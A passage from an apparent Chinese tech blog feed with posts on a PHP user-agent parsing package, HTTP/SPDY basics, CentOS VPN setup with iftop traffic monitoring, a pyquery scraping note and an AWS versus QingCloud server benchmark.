      <content type="html"><![CDATA[<p><br></p>
<h1 id="0x01-JueUserAgent"><a href="#0x01-JueUserAgent" class="headerlink" title="0x01.JueUserAgent"></a>0x01.JueUserAgent</h1><p>JueUserAgent 是一个为<a href="http://jue.so" target="_blank" rel="external">http://jue.so</a> 而写的php包.</p>
<p>主要用于获取用户浏览器代理信息，用户referrer，设备，版本等。</p>
<p>JueUserAgent主要解析$_SERVER，分析http报头信息。</p>
<p>Fork me here: <a href="http://xiaocao.u.qiniudn.com/blog%2FUserAgent.zip" target="_blank" rel="external">http://77l5jp.com1.z0.glb.clouddn.com/blog%2FUserAgent.zip</a></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x02-关于http报头"><a href="#0x02-关于http报头" class="headerlink" title="0x02.关于http报头"></a>0x02.关于http报头</h1><h4 id="关于http报头详细请看这里-nbsp-nbsp-nbsp-nbsp-《小草浅浅谈web二》"><a href="#关于http报头详细请看这里-nbsp-nbsp-nbsp-nbsp-《小草浅浅谈web二》" class="headerlink" title="关于http报头详细请看这里: &nbsp;&nbsp;&nbsp;&nbsp;《小草浅浅谈web二》"></a>关于http报头详细请看这里: &nbsp;&nbsp;&nbsp;&nbsp;<a href="http://homeway.me/2014/09/11/%E5%B0%8F%E8%8D%89%E6%B5%85%E6%B5%85%E8%B0%88web%EF%BC%88%E4%BA%8C%EF%BC%89/">《小草浅浅谈web二》</a></h4><h4 id="利用php魔术变量-SERVER得到："><a href="#利用php魔术变量-SERVER得到：" class="headerlink" title="利用php魔术变量$_SERVER得到："></a>利用php魔术变量$_SERVER得到：</h4><p><img src="http://xiaocao.u.qiniudn.com/blog/useragent-2014-09-21.gif" alt="$_SERVER获取http报头"></p>
<h4 id="于是找到相关教程，抄了一大段：http-www-5idev-com-p-php-server-shtml"><a href="#于是找到相关教程，抄了一大段：http-www-5idev-com-p-php-server-shtml" class="headerlink" title="于是找到相关教程，抄了一大段：http://www.5idev.com/p-php_server.shtml"></a>于是找到相关教程，抄了一大段：<a href="http://www.5idev.com/p-php_server.shtml" target="_blank" rel="external">http://www.5idev.com/p-php_server.shtml</a></h4><p>页面程序相关</p>
<pre><code>$_SERVER[&#39;PHP_SELF&#39;]：相对于网站根目录的路径及 PHP 程序名称，与 document root 相关。
$_SERVER[&#39;HTTP_REFERER&#39;]：链接到当前页面的前一页面的 URL 地址。
$_SERVER[&#39;SCRIPT_NAME&#39;]：相对于网站根目录的路径及 PHP 程序文件名称 。
$_SERVER[&#39;REQUEST_URI&#39;]：访问此页面所需的 URI 。
$_SERVER[&#39;SCRIPT_FILENAME&#39;]：当前运行 PHP 程序的绝对路径及文件名。
$_SERVER[&#39;PATH_TRANSLATED&#39;]：当前 PHP 程序所在文件系统（不是文档根目录）的基本路径。
$_SERVER[&#39;QUERY_STRING&#39;]：查询（query）的字符串（URL 中第一个问号 ? 之后的内容但不包括 # 后面的内容）。
$_SERVER[&#39;argv&#39;]：传递给当前 PHP 程序的参数。
$_SERVER[&#39;argc&#39;]：命令行模式下，包含传递给程序的命令行参数的个数。
$_SERVER[&#39;REQUEST_TIME&#39;]：请求开始时的时间戳，从 PHP 5.1.0 起有效。
$_SERVER[&#39;REQUEST_METHOD&#39;]：访问页面时的请求方法，例如：“GET”、“HEAD”，“POST”或“PUT”。
$_SERVER[&#39;HTTP_ACCEPT&#39;]：当前请求的 Accept: 头信息的内容。
$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]：当前请求的 Accept-Charset: 头信息的内容。例如：“iso-8859-1,*,utf-8”。
$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]：当前请求的 Accept-Encoding: 头信息的内容。例如：“gzip”。
$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]：当前请求的 Accept-Language: 头信息的内容。例如：“zh-cn”。
$_SERVER[&#39;HTTP_CONNECTION&#39;]：当前请求的 Connection: 头信息的内容。例如：“Keep-Alive”。
$_SERVER[&#39;HTTP_HOST&#39;]：当前请求的 Host: 头信息的内容。
$_SERVER[&#39;HTTPS&#39;]：如果 PHP 程序是通过 HTTPS 协议被访问，则被设为一个非空的值。
$_SERVER[&#39;PHP_AUTH_DIGEST&#39;]：当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization”HTTP 头内容（以便作进一步的认证操作）。
$_SERVER[&#39;PHP_AUTH_USER&#39;]：当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。
$_SERVER[&#39;PHP_AUTH_PW&#39;]：当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。
$_SERVER[&#39;AUTH_TYPE&#39;]：当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。
</code></pre><p>服务器端相关</p>
<pre><code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]：当前运行 PHP 程序所在的文档根目录，在服务器配置文件中定义。
$_SERVER[&#39;GATEWAY_INTERFACE&#39;]：服务器使用的 CGI 规范的版本，例如：“CGI/1.1”。
$_SERVER[&#39;SERVER_ADDR&#39;]：当前运行 PHP 程序所在的服务器的 IP 地址。
$_SERVER[&#39;SERVER_NAME&#39;]：当前运行 PHP 程序所在的服务器的名称。
$_SERVER[&#39;SERVER_ADMIN&#39;]：Apache 服务器配置文件中的 SERVER_ADMIN 参数。
$_SERVER[&#39;SERVER_PORT&#39;]：服务器所使用的端口。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。
$_SERVER[&#39;SERVER_SIGNATURE&#39;]：包含服务器版本和虚拟主机名的字符串。
$_SERVER[&#39;SERVER_SOFTWARE&#39;]：服务器标识的字串，在响应请求时的头信息中给出。
$_SERVER[&#39;SERVER_PROTOCOL&#39;]：请求页面时通信协议的名称和版本，例如：“HTTP/1.0”。
</code></pre><p>其他杂项</p>
<pre><code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]：当前请求的 User-Agent: 头信息的内容，该字符串表明了访问该页面的用户代理的信息。
$_SERVER[&#39;REMOTE_ADDR&#39;]：正在浏览当前页面用户的 IP 地址。
$_SERVER[&#39;REMOTE_HOST&#39;]：正在浏览当前页面用户的主机名。
$_SERVER[&#39;REMOTE_PORT&#39;]：用户连接到服务器时所使用的端口。
</code></pre><p>注意，如果以命令行方式运行 PHP，上面列出的元素几乎没有有效的（或是没有任何实际意义的）</p>
<p><br><hr><br></p>
<h1 id="0x03-使用教程（api）"><a href="#0x03-使用教程（api）" class="headerlink" title="0x03 使用教程（api）"></a>0x03 使用教程（api）</h1><p>初始化:</p>
<blockquote>
<p>$jue = new JueAgent();</p>
</blockquote>
<p>当JueUserAgent 类初始化后，它会判断浏览你的网站是Web浏览器，还是移动设备，还是机器人。</p>
<pre><code>if ($jue-&gt;is_browser()) {
    $agent = $jue-&gt;browser().&#39; &#39;.$jue-&gt;version();
} elseif ($jue-&gt;is_robot()) {
    $agent = $jue-&gt;robot();
} elseif ($jue-&gt;is_mobile()) {
    $agent = $jue-&gt;mobile();
} else {
    $agent = &#39;Unidentified User Agent&#39;;
}

echo $agent;

echo $jue-&gt;platform(); // Platform info (Windows, Linux, Mac, etc.)
</code></pre><p>函数参考:</p>
<blockquote>
<p>$jue-&gt;is_browser();</p>
</blockquote>
<pre><code>根据用户代理是否是一个已知的web浏览器，返回 TRUE/FALSE (boolean)

if ($jue-&gt;is_browser(&#39;Safari&#39;)) {
    echo &#39;You are using Safari.&#39;;
} else if ($jue-&gt;is_browser()) {
    echo &#39;You are using a browser.&#39;;
}
</code></pre><p>Note:  字符串 “Safari”是已定义的浏览器列表的数组键，如果您想添加新的浏览器，可以修改config.php。</p>
<blockquote>
<p>$jue-&gt;is_mobile()</p>
</blockquote>
<p>根据用户代理是否是一个已知的移动设备，返回 TRUE/FALSE (boolean)</p>
<pre><code>if ($jue-&gt;is_mobile(&#39;iphone&#39;)) {
    $this-&gt;load-&gt;view(&#39;iphone/home&#39;);
} else if ($jue-&gt;is_mobile()) {
    $this-&gt;load-&gt;view(&#39;mobile/home&#39;);
} else {
    $this-&gt;load-&gt;view(&#39;web/home&#39;);
}
</code></pre><blockquote>
<p>$jue-&gt;is_robot()</p>
</blockquote>
<pre><code>根据用户代理是否是机器人，返回 TRUE/FALSE (boolean)

注意:  用户代理类仅包含了最常见的机器人定义。它不是一个完整的机器人清单。如果你觉得有些经常访问你的网站的机器人不在名单中，你可以将它们添加到你的.lib/config.php 文件中.
</code></pre><blockquote>
<p>$jue-&gt;is_referral()</p>
</blockquote>
<p>根据用户代理是否是从另一网站链接过来，返回 TRUE/FALSE (boolean)</p>
<blockquote>
<p>$jue-&gt;browser()</p>
</blockquote>
<p>返回一个字符串，就是浏览你的网站的浏览器名称</p>
<blockquote>
<p>$jue-&gt;version()</p>
</blockquote>
<p>返回浏览器的版本号</p>
<blockquote>
<p>$jue-&gt;mobile()</p>
</blockquote>
<p>返回访问你的站点的移动设备名称</p>
<blockquote>
<p>$jue-&gt;robot()</p>
</blockquote>
<p>返回访问你的站点的机器人名称</p>
<blockquote>
<p>$jue-&gt;platform()</p>
</blockquote>
<p>返回访问你的站点的操作系统(Linux, Windows, OS X, 等等).</p>
<blockquote>
<p>$jue-&gt;referrer()</p>
</blockquote>
<p>如果用户代理是从其他站点链接过来的，你可以做如下判断</p>
<pre><code>if ($jue-&gt;is_referral()) {
    echo $jue-&gt;referrer();
}
</code></pre><blockquote>
<p>$jue-&gt;agent_string()</p>
</blockquote>
<p>返回一个字符串包含所有用户代理信息。通常它会是这样的:</p>
<p>Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.4) Gecko/20060613 Camino/1.0.2</p>
<blockquote>
<p>$jue-&gt;accept_lang()</p>
</blockquote>
<p>让你确认，用户代理是否包含一种特定的语言。例:</p>
<pre><code>if ($jue-&gt;accept_lang(&#39;en&#39;)) {
    echo &#39;You accept English!&#39;;
}
</code></pre><p>注意: 这一功能通常不是很可靠，因为有些浏览器不提供语言信息，即使提供了，也不一定准确</p>
<blockquote>
<p>$jue-&gt;accept_charset()</p>
</blockquote>
<p>让你确认，用户代理是否包含一种特定的字符集。例:</p>
<pre><code>if ($jue-&gt;accept_charset(&#39;utf-8&#39;)) {
    echo &#39;You browser supports UTF-8!&#39;;
}
</code></pre><p><br><hr><br></p>
<h4 id="本文出处-夏日小草-转载请注明出处：-http-homeway-me-2014-06-21-php-package-for-useragent"><a href="#本文出处-夏日小草-转载请注明出处：-http-homeway-me-2014-06-21-php-package-for-useragent" class="headerlink" title="本文出处  夏日小草, 转载请注明出处： http://homeway.me/2014/06/21/php-package-for-useragent/"></a>本文出处  <a href="http://homeway.me">夏日小草</a>, 转载请注明出处： <a href="http://homeway.me/2014/06/21/php-package-for-useragent/">http://homeway.me/2014/06/21/php-package-for-useragent/</a></h4><p><br></p>
<p>-By 小草</p>
<p>2014-06-21 10:32:33</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[小草浅浅谈web（二）]]></title>
      <url>http://homeway.me/2014/06/11/xiaocao-share-web-2/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="本文主要包含：http-amp-web加速"><a href="#本文主要包含：http-amp-web加速" class="headerlink" title="本文主要包含：http &amp; web加速"></a>本文主要包含：http &amp; web加速</h4><a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-http-1-0-1-1"><a href="#0x01-http-1-0-1-1" class="headerlink" title="0x01.http 1.0/1.1"></a>0x01.http 1.0/1.1</h1><p>http网上讲的很多啦，不外乎就那几点。</p>
<p>先看个http流程图：</p>
<p><img src="https://static.blog.homeway.me/blog%2Fcompliance-reverse-proxy.png" alt="http流程"></p>
<p>http 1.0, 一个请求开启一次TCP连接。</p>
<p><img src="https://static.blog.homeway.me/blog%2Fhttp1.0-server-push-2014-09-11.jpg" alt="http 1.0链接方式"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhttp1.1-server-push-2014-09-11.jpg" alt="http 1.1链接方式"></p>
<p>详细的看这里吧： <a href="http://blog.csdn.net/forgotaboutgirl/article/details/6936982" target="_blank" rel="external">http://blog.csdn.net/forgotaboutgirl/article/details/6936982</a></p>
<p><br><hr><br></p>
<h1 id="0x02-http-2-0"><a href="#0x02-http-2-0" class="headerlink" title="0x02.http 2.0"></a>0x02.http 2.0</h1><p>http 2.0将可能引入 <a href="http://baike.baidu.com/view/2984528.htm" target="_blank" rel="external">SPDY</a> 协议。</p>
<p>SODY协议是由google基于TCP应用层协议，避开HTTP的短连接损耗，同时支持多路复用(利用多stream机制)，使得服务端和客户端仅需一个TCP连接即可传输任意内容，大大节省服务器资源，提高网络利用率。同时易于部署，服务端客户端加上SPDY协议的解析即可，对于应用开发人员、应用用户而言不需要任何额外知识。</p>
<p>SPDY有几个新特性：</p>
<ul>
<li><h4 id="多路stream"><a href="#多路stream" class="headerlink" title="多路stream"></a>多路stream</h4></li>
</ul>
<p>SPDY允许在单一TCP连接上并发无限个stream。由于请求可以在单一通道上交错，TCP的效率高了许多：只需很少的连接，并且网络封包也可以更少更紧凑。</p>
<p>当你打开一个TCP链接，发送请求包，将持续收到stream式数据。</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhttp2.0-connection-stream-2014-09-10.png" alt="SPDY 连接流"></p>
<p><br><hr><br></p>
<ul>
<li><h4 id="HTTP头内容压缩"><a href="#HTTP头内容压缩" class="headerlink" title="HTTP头内容压缩"></a>HTTP头内容压缩</h4></li>
</ul>
<p>SPDY允许压缩HTTP请求和响应头，因此可以（比传统HTTP）传输更少的包和数据.</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhttp2.0-Header-Compression-2014-09-10.png" alt="SPDY 压缩"></p>
<p><br><hr><br></p>
<ul>
<li><h4 id="服务器推送流-Server-Push"><a href="#服务器推送流-Server-Push" class="headerlink" title="服务器推送流(Server Push)"></a>服务器推送流(Server Push)</h4></li>
</ul>
<p>http 1.0时代，服务器只能被动接受，客户端主动请求，服务器只负责回馈数据。</p>
<p>SPDY在实验服务器通过声明X-Associated-Content头来推送内容。服务端通过这个头告知客户端需要推送资源。</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhttp2.0-server-push-2014-09-10.png" alt="SPDY 连接"></p>
<p><br><hr><br></p>
<ul>
<li>与HTTP兼容</li>
</ul>
<p>HTTP本身是单次请求+单次响应的结构，所以SPDY中使用带有FLAG_FIN的SYN_STREAM来兼容HTTP请求，而带有FLAG_FIN的SYN_REPLY来兼容HTTP响应。对于带有请求body（上传文件）的情况，这时在SYN_STREAM可以不包含FLAG_FIN标识，然后客户端将数据按数据帧的大小限制（最大2^31 – 1）进行拆分，跟随发送若干数据帧，在最后一个数据帧上带有FLAG_FIN即可。对于服务端响应中的大量内容（如HTML页面、JS、CSS等），同样采用类似方法，只在最后一个数据帧带上FLAG_FIN。</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhpbn_1303.png" alt="SPDY 兼容"></p>
<p><br><hr><br></p>
<h1 id="0x03-web速度"><a href="#0x03-web速度" class="headerlink" title="0x03.web速度"></a>0x03.web速度</h1><p>先看看你点击一个网站产生的数据流。</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fget-a-web-2014-09-12.jpg" alt="访问 web数据流 "></p>
<p><br><hr><br></p>
<ul>
<li><p>网口转换</p>
</li>
<li><p>数据形式转换</p>
</li>
<li><p>光缆/电缆传输</p>
</li>
<li><p>ISP接入</p>
</li>
<li><p>服务器解析</p>
</li>
<li><p>客户端渲染</p>
</li>
<li><p>还有一个重要的： DNS查询</p>
</li>
</ul>
<hr>

<p>一个web测试网站：<a href="http://www.webpagetest.org/" target="_blank" rel="external">http://www.webpagetest.org/</a></p>
<p>下面对醒来网站的测试：</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fxinglai.org2014-09-12.png" alt="http://xinglai.org/ 测试"></p>
<p>从下面的测试可以看出，访问一个网站耗时的几个东西：</p>
<ul>
<li><p>下载一个很大的png</p>
</li>
<li><p>DNS查询</p>
</li>
<li><p>TCP流初始化时间</p>
</li>
</ul>
<p><br><hr><br></p>
<p>关于网络带宽与延迟的测试</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fbandwidth-dns-2014-09-12.jpg" alt="网络带宽与延迟"></p>
<p>从上面很容易看到，网络带宽不是最主要的问题，网络延迟才是主要问题。</p>
<p>查看你本地的DNS缓存：<a href="chrome://dns" target="_blank" rel="external">chrome://dns</a></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处：http-homeway-me-2014-06-11-xiaocao-share-web-2"><a href="#本文出自-夏日小草-转载请注明出处：http-homeway-me-2014-06-11-xiaocao-share-web-2" class="headerlink" title="本文出自 夏日小草,转载请注明出处：http://homeway.me/2014/06/11/xiaocao-share-web-2/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处：<a href="http://homeway.me/2014/06/11/xiaocao-share-web-2/">http://homeway.me/2014/06/11/xiaocao-share-web-2/</a></h5><p><br></p>
<p>-by 小草</p>
<p>2014-06-11 21:57:14</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Centos搭建VPN-iftop流量监测]]></title>
      <url>http://homeway.me/2014/05/23/centos-install-vpn-and-use-iftop-monitoring-traffic/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="关于Centos安装、配置VPN，以及用iftop检测系统流量。"><a href="#关于Centos安装、配置VPN，以及用iftop检测系统流量。" class="headerlink" title="关于Centos安装、配置VPN，以及用iftop检测系统流量。"></a>关于Centos安装、配置VPN，以及用iftop检测系统流量。</h4><a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-一键安装VPN"><a href="#0x01-一键安装VPN" class="headerlink" title="0x01.一键安装VPN"></a>0x01.一键安装VPN</h1><ul>
<li>###安装</li>
</ul>
<p>安装VPN前先配置防火墙,很简单。</p>
<p><a href="http://www.vpser.net/security/linux-iptables.html" target="_blank" rel="external">http://www.vpser.net/security/linux-iptables.html</a></p>
<p>如果是亚马逊服务器，记得在EC2控制台开启IO端口。</p>
<p><br></p>
<p>一键安装VPN的教程很多了，网上shell源码也有。</p>
<p><a href="http://blog.hackroad.com/operations-engineer/linux_server/10095.html" target="_blank" rel="external">http://blog.hackroad.com/operations-engineer/linux_server/10095.html</a></p>
<ul>
<li>###使用</li>
</ul>
<p>windows下连接VPN:</p>
<p><a href="http://jingyan.baidu.com/article/358570f607a198ce4724fcde.html" target="_blank" rel="external">http://jingyan.baidu.com/article/358570f607a198ce4724fcde.html</a></p>
<p><br></p>
<p>MAC下找到系统偏好设置-&gt;网络-&gt;VPN：</p>
<p><img src="https://static.blog.homeway.me/blog%2F2014-10-23-VPN-connect-1.gif" alt="vpn添加"></p>
<p><br></p>
<p><img src="https://static.blog.homeway.me/blog%2F2014-10-23-VPN-connect-2.gif" alt="vpn添加"></p>
<p><br></p>
<ul>
<li><h3 id="查看VPN在线用户："><a href="#查看VPN在线用户：" class="headerlink" title="查看VPN在线用户："></a>查看VPN在线用户：</h3></li>
</ul>
<blockquote>
<p> last | grep still | grep ppp</p>
</blockquote>
<p><img src="https://static.blog.homeway.me/blog%2F2014-10-23-VPN-connect-3.gif" alt="vpn在线用户"></p>
<p><br></p>
<ul>
<li><h3 id="通过网卡查看"><a href="#通过网卡查看" class="headerlink" title="通过网卡查看:"></a>通过网卡查看:</h3></li>
</ul>
<blockquote>
<p>ifconfig | grep ppp</p>
</blockquote>
<p><br></p>
<ul>
<li><h3 id="添加删除用户"><a href="#添加删除用户" class="headerlink" title="添加删除用户"></a>添加删除用户</h3></li>
</ul>
<blockquote>
<p>vim /etc/ppp/chap-secrets</p>
</blockquote>
<p><br><hr><br></p>
<h1 id="0x02-iftop监测VPN流量"><a href="#0x02-iftop监测VPN流量" class="headerlink" title="0x02.iftop监测VPN流量"></a>0x02.iftop监测VPN流量</h1><ul>
<li><h3 id="CentOS上安装所需依赖包："><a href="#CentOS上安装所需依赖包：" class="headerlink" title="CentOS上安装所需依赖包："></a>CentOS上安装所需依赖包：</h3></li>
</ul>
<blockquote>
<p>yum install flex byacc  libpcap ncurses ncurses-devel libpcap-devel</p>
</blockquote>
<ul>
<li><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3></li>
</ul>
<p>很多地方用的都是同一个连接(<a href="http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz)，然后那个连接挂了。" target="_blank" rel="external">http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz)，然后那个连接挂了。</a></p>
<p>试试这个：</p>
<p><a href="http://pkgs.repoforge.org/iftop/" target="_blank" rel="external">http://pkgs.repoforge.org/iftop/</a></p>
<p><br></p>
<ul>
<li><h3 id="监测流量"><a href="#监测流量" class="headerlink" title="监测流量"></a>监测流量</h3></li>
</ul>
<p>界面上面显示的是类似刻度尺的刻度范围，为显示流量图形的长条作标尺用的。</p>
<p>中间的&lt;= =&gt;这两个左右箭头，表示的是流量的方向。</p>
<p>TX：发送流量</p>
<p>RX：接收流量</p>
<p>TOTAL：总流量</p>
<p>Cumm：运行iftop到目前时间的总流量</p>
<p>peak：流量峰值</p>
<p>rates：分别表示过去 2s 10s 40s 的平均流量</p>
<p><br></p>
<ul>
<li><h3 id="关于参数"><a href="#关于参数" class="headerlink" title="关于参数"></a>关于参数</h3></li>
</ul>
<p>问下man就好了。</p>
<p>或者看着里:</p>
<p><a href="http://www.vpser.net/manage/iftop.html" target="_blank" rel="external">http://www.vpser.net/manage/iftop.html</a></p>
<p><br></p>
<p><img src="https://static.blog.homeway.me/blog%2F2014-10-23-VPN-connect-4.gif" alt="iftop"></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-05-23-centos-install-vpn-and-use-iftop-monitoring-traffic"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-05-23-centos-install-vpn-and-use-iftop-monitoring-traffic" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/05/23/centos-install-vpn-and-use-iftop-monitoring-traffic/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/05/23/centos-install-vpn-and-use-iftop-monitoring-traffic/">http://homeway.me/2014/05/23/centos-install-vpn-and-use-iftop-monitoring-traffic/</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-05-23 13:00:07</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[pyquery抓取页面]]></title>
      <url>http://homeway.me/2014/05/06/python-pquery-reptile/</url>
      <content type="html"><![CDATA[<p><br></p>
<h5 id="Python学习笔记"><a href="#Python学习笔记" class="headerlink" title="Python学习笔记."></a>Python学习笔记.</h5><h5 id="Python基础，尝试用pyquery做爬虫测试"><a href="#Python基础，尝试用pyquery做爬虫测试" class="headerlink" title="Python基础，尝试用pyquery做爬虫测试."></a>Python基础，尝试用pyquery做爬虫测试.</h5><a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-目标"><a href="#0x01-目标" class="headerlink" title="0x01.目标"></a>0x01.目标</h1><p>想给爬爬，www.lofter.com里面的东西。</p>
<p>于是，找了一个主题，就对着写了。</p>
<p>写完了，突然想起，每个主题，节点不一样，关于这个主题，可以运行，先留着吧。</p>
<h5 style="color:red">注意：节点问题，这个主题才可以运行， <a href="http://grasses.lofter.com/" target="_blank" rel="external">http://grasses.lofter.com/</a></h5>

<p><br><hr><br></p>
<h1 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02.源码"></a>0x02.源码</h1><h5 id="源码下载在这里-https-static-blog-homeway-me-blog-2Flofter-spider-2014-10-06-zip"><a href="#源码下载在这里-https-static-blog-homeway-me-blog-2Flofter-spider-2014-10-06-zip" class="headerlink" title="源码下载在这里: https://static.blog.homeway.me/blog%2Flofter-spider-2014-10-06.zip"></a>源码下载在这里: <a href="https://static.blog.homeway.me/blog%2Flofter-spider-2014-10-06.zip" target="_blank" rel="external">https://static.blog.homeway.me/blog%2Flofter-spider-2014-10-06.zip</a></h5><p>时间比较晚了，而且，有点懒，这里只贴部分代码：（详细待续…..）</p>
<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog%2FPython-PyQuery-Learning-1-2014-10-06.gif" alt="运行结果"></p>
<p><br></p>
<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog%2FPython-PyQuery-Learning-2-2014-10-06.gif" alt="运行结果"></p>
<p><br><hr><br></p>
<h1 id="0x03-PyQuery基础"><a href="#0x03-PyQuery基础" class="headerlink" title="0x03.PyQuery基础"></a>0x03.PyQuery基础</h1><p>官网在这里: <a href="https://pypi.python.org/pypi/pyquery" target="_blank" rel="external">https://pypi.python.org/pypi/pyquery</a></p>
<p>详细的这里已经说的很清楚了，写过jquery的应该很了解节点的操作。<a href="http://www.yenching.org/lab/pyquery/" target="_blank" rel="external">http://www.yenching.org/lab/pyquery/</a></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-《-Python-PyQuery-爬虫实验一-》"><a href="#本文出自-夏日小草-转载请注明出处-《-Python-PyQuery-爬虫实验一-》" class="headerlink" title="本文出自 夏日小草,转载请注明出处: 《 Python-PyQuery-爬虫实验一 》"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/05/06/python-pquery-reptile/"> 《 Python-PyQuery-爬虫实验一 》</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-05-06 04:34:01</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[服务器对比]]></title>
      <url>http://homeway.me/2014/04/13/server-performance-test-for-aws-vs-qingcloud/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-amazon.jpg" alt="nginx-reverse-proxy-conf"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>做个服务器性能比对检测，主要测试服务器IO，网络，web服务，价格比对等。</p>
<p><br><hr><br></p>
<h1 id="0x02-关于服务器环境"><a href="#0x02-关于服务器环境" class="headerlink" title="0x02.关于服务器环境"></a>0x02.关于服务器环境</h1><p>青云：</p>
<pre><code>CPU : 单核
内存 : 1GB
硬盘 : 18045 MB
带宽 : 4Mbps
OS  : Centos 6.5
</code></pre><p>亚马逊：</p>
<pre><code>CPU : 单核,2.5 GHz
内存 : 1GB
硬盘 : 10GB, SSD / IOPS 30~3000 
OS  : Centos 7
</code></pre><p><br><hr><br></p>
<h1 id="0x03-关于IO性能测试"><a href="#0x03-关于IO性能测试" class="headerlink" title="0x03.关于IO性能测试"></a>0x03.关于IO性能测试</h1><h3 id="dd-测试IO性能"><a href="#dd-测试IO性能" class="headerlink" title="dd 测试IO性能"></a>dd 测试IO性能</h3><p>青云：</p>
<blockquote>
<p>time dd if=/dev/hda of=/dev/null bs=8k count=102400    </p>
</blockquote>
<pre><code>记录了200000+0 的读入
记录了200000+0 的写出
1638400000字节(1.6 GB)已复制，12.3522 秒，133 MB/秒(第一发)
1638400000字节(1.6 GB)已复制，12.3624 秒，133 MB/秒(第二发)
1638400000字节(1.6 GB)已复制，12.3363 秒，133 MB/秒(第三发)
</code></pre><p>亚马逊:</p>
<blockquote>
<p>time dd if=/dev/hda of=/dev/null bs=8k count=102400</p>
</blockquote>
<pre><code>记录了113059+0 的读入    
记录了113058+0 的写出
926162944字节(926 MB)已复制，14.9513 秒，61.9 MB/秒
dd: 正在写入&quot;null&quot;: 设备上没有空间
926167040字节(926 MB)已复制，14.9861 秒，61.8 MB/秒
dd: 正在写入&quot;null&quot;: 设备上没有空间
926171136字节(926 MB)已复制，14.7898 秒，62.6 MB/秒    dd: 正在写入&quot;null&quot;: 设备上没有空间
</code></pre><p>(好像在这里，这个串口没有足够的大小，然后我不清楚，换哪个)</p>
<p><br><hr><br></p>
<h1 id="http请求测试"><a href="#http请求测试" class="headerlink" title="http请求测试"></a>http请求测试</h1><h3 id="pylot测试http请求压力"><a href="#pylot测试http请求压力" class="headerlink" title="pylot测试http请求压力"></a>pylot测试http请求压力</h3><p>青云: </p>
<p><img width="75%" alt="青云http请求" src="/image/2014-12-13-server-http-speed-qing.png"></p>
<p><br></p>
<p>亚马逊: </p>
<p><img width="75%" alt="亚马逊http请求" src="/image/2014-12-13-server-http-speed-aws.png"></p>
<p><br><hr><br></p>
<h1 id="价格分析"><a href="#价格分析" class="headerlink" title="价格分析"></a>价格分析</h1><p>亚马逊送的：</p>
<ul>
<li><p>750 小时运行 Linux、RHEL 或 SLES t2.micro 实例的 EC2 使用时间</p>
</li>
<li><p>750 小时运行 Microsoft Windows Server t2.micro 实例的 EC2 使用时间</p>
</li>
<li><p>750 小时 Elastic Load Balancing 加上 15 GB 数据处理</p>
</li>
<li><p>30 GB 的 Amazon Elastic Block Storage（以任意方式对通用型 (SSD) 或磁性介质型进行组合），附加 200 万次 I/O（采用磁性介质）和 1 GB 快照存储</p>
</li>
<li><p>适用于所有 AWS 服务的共计 15 GB 的带宽传出</p>
</li>
<li><p>1 GB 区域数据传输</p>
</li>
</ul>
<p>amazon 的ec2，最具亮点的就是他的免费使用一年的消息。</p>
<p>对于新用户，可以拥有Amazon EC2 的Micro Instances(微型实例)一个使用一年及相应的一些空间和流量配额，超出的部分才要算钱。</p>
